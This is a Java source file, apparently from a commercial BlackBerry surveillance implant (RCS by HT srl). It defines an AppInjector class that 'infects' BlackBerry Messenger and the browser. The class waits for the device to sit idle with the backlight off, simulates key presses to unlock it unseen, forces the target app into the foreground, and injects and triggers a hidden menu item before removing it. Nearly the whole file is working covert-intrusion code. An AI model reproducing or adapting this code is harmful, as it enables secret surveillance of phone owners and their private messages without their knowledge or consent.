//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.injection;

import net.rim.device.api.system.ApplicationDescriptor;
import net.rim.device.api.system.ApplicationManager;
import net.rim.device.api.system.DeviceInfo;
import net.rim.device.api.ui.Keypad;
import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.UiApplication;
import blackberry.Status;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.module.im.InjectMenuItem;
import blackberry.utils.Utils;

public abstract class AppInjector {
    public static final int APP_BBM = 1;
    public static final int APP_BROWSER = 2;
    //#ifdef DEBUG
    private static Debug debug = new Debug("AppInjector", DebugLevel.VERBOSE);
    //#endif

    //private AppInjectorInterface delegate;

    ApplicationManager manager = ApplicationManager.getApplicationManager();
    private Status status=Status.self();
    private boolean infected;
    private boolean infecting;
    private Object infectingLock = new Object();
    public static final int KEY_LOCK = 4099;

    protected abstract String getAppName();

    protected abstract int getDelay();

    protected abstract boolean actualCallMenuByKey();

    public boolean callMenuByKey() {
        //#ifdef DEBUG
        debug.trace("callMenu");
        //#endif

        final int foregroundProcess = manager.getForegroundProcessId();

        // debug.trace("searching Messenger or Browser");
        ApplicationDescriptor[] apps = manager.getVisibleApplications();
        for (int i = 0; i < apps.length; i++) {

            if (manager.getProcessId(apps[i]) == foregroundProcess) {
                //#ifdef DEBUG
                debug.trace("callMenuByKey foreground: " + apps[i].getName());
                //#endif

                if (apps[i].getName().indexOf(getAppName()) >= 0) {
                    //MemoryCleanerDaemon.cleanAll();
                    return actualCallMenuByKey();

                }
            }
        }
        return false;
    }

    public void callMenuInContext() {
        //#ifdef DEBUG

        debug.trace("callMenuInContext"); //$NON-NLS-1$
        //#endif
        menu.callMenuInContext();
    }

    public void setInfected(boolean value) {
        infected = value;
    }

    public boolean isInfected() {
        return infected;
    }

    protected InjectMenuItem menu;

    public boolean injectMenu() {
        //#ifdef DEBUG
        debug.trace("injectMenu"); //$NON-NLS-1$
        //#endif
        menu.addMenuBBM();
        return true;
    }

    public boolean deleteMenu() {
        //#ifdef DEBUG
        debug.trace("deleteMenu"); //$NON-NLS-1$
        //#endif
        menu.removeMenuBBM();
        return true;
    }

    public void infect() {
        //#ifdef DEBUG
        debug.trace("infect");
        //#endif

        if (status.backlightEnabled() || isInfected() || isInfecting()) {
            //#ifdef DEBUG
            debug.trace("infected or backlight, bailing out");
            //#endif
            return;
        }

        synchronized (infectingLock) {
            infecting = true;
        }

        //#ifdef DEBUG
        debug.trace("infect, wait " + getDelay() + " ms");
        //#endif
        Utils.sleep(getDelay());

        if (isInfected()) {
            //#ifdef DEBUG
            debug.trace("infected, bailing out");
            //#endif
            return;
        }

        if (DeviceInfo.getIdleTime() < 10) {
            //#ifdef DEBUG
            debug.trace("infect: not enough idle time");
            //#endif
            return;
        }

        status.setBacklight(false);

        manager.requestForegroundForConsole();
        unLock();

        if (status.backlightEnabled()) {
            //#ifdef DEBUG
            debug.trace("infected: fail");
            //#endif
            return;
        }

        int req = requestForeground();
        Utils.sleep(500);
        boolean fore = checkForeground();

        if (fore) {
            try {
                Utils.sleep(200);
                injectMenu();
                Utils.sleep(200);
                if (!callMenuByKey()) {
                    //#ifdef DEBUG
                    debug.trace("infect: failed callMenuByKey");
                    //#endif
                }
                Utils.sleep(200);
            } catch (Exception ex) {
                //#ifdef DEBUG
                debug.error("infect: " + ex);
                //#endif
            }
            deleteMenu();
            Utils.sleep(200);

            //if (req == 2 && checkForeground()) {
            //#ifdef DEBUG
            debug.trace("infect: requesting foreground console");
            //#endif
            manager.requestForegroundForConsole();
            //}
        } else {
            //#ifdef DEBUG
            debug.error("infect: failed to get foreground");
            //#endif
        }

        synchronized (infectingLock) {
            infecting = false;
        }
    }

    private boolean isInfecting() {
        synchronized (infectingLock) {
            return infecting;
        }

    }

    /**
     * verifica se occorre procedere con l'unlock.
     */
    private void unLock() {
        //#ifdef DEBUG
        debug.trace("unLock");
        //#endif

        KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
        Utils.sleep(200);

        if (status.backlightEnabled()) {
            //#ifdef DEBUG
            debug.trace("Backlight still enabled, getHardwareLayout: "
                    + Keypad.getHardwareLayout());
            //#endif

            KeyInjector.pressRawKeyCode(Keypad.KEY_SPEAKERPHONE);
            Utils.sleep(200);
            KeyInjector.pressRawKeyCode(KEY_LOCK);
            Utils.sleep(200);
            status.setBacklight(false);
            Utils.sleep(500);
            for (int i = 0; i < 10; i++) {
                if (status.backlightEnabled()) {
                    //Backlight.enable(false);
                    Utils.sleep(500);
                    //#ifdef DEBUG
                    debug.trace("unLock: backlight still enabled");
                    //#endif
                } else {
                    break;
                }
            }

            return;
        }

        //Main.getInstance().showBlackScreen(false); 
    }

    private boolean checkForeground() {
        int foregroundPin = manager.getForegroundProcessId();
        ApplicationDescriptor[] apps = manager.getVisibleApplications();
        for (int i = 0; i < apps.length; i++) {
            //#ifdef DEBUG
            debug.trace("checkForeground: " + apps[i].getName());
            //#endif
            if (apps[i].getName().indexOf(getAppName()) >= 0) {
                int processId = manager.getProcessId(apps[i]);

                if (foregroundPin == processId) {
                    Screen screen = UiApplication.getUiApplication()
                            .getActiveScreen();
                    //#ifdef DEBUG
                    debug.trace("checkForeground, found active screen: "
                            + screen);
                    //#endif
                    return true;
                } else {
                    //#ifdef DEBUG
                    debug.trace("checkForeground, found but not foreground");
                    //#endif
                    return false;
                }
            }
        }
        return false;
    }

    private int requestForeground() {
        int foregroundPin = manager.getForegroundProcessId();
        ApplicationDescriptor[] apps = manager.getVisibleApplications();
        //#ifdef DEBUG
        debug.trace("requestForeground " + getAppName());
        //#endif
        for (int i = 0; i < apps.length; i++) {
            //#ifdef DEBUG
            debug.trace("requestForeground, testing " + apps[i].getName());
            //#endif
            if (apps[i].getName().indexOf(getAppName()) >= 0) {
                int processId = manager.getProcessId(apps[i]);

                if (foregroundPin == processId) {
                    //#ifdef DEBUG
                    debug.trace("requestForeground: already foreground");
                    //#endif
                    return 1;
                } else {
                    //#ifdef DEBUG
                    debug.trace("requestForeground: bringing foreground");
                    //#endif
                    manager.requestForeground(processId);
                    return 2;
                }
            }
        }

        return 0;
    }

    //#ifdef DEBUG
    public void disinfect() {
        debug.warn("disinfect");
        setInfected(false);
    }
    //#endif

}
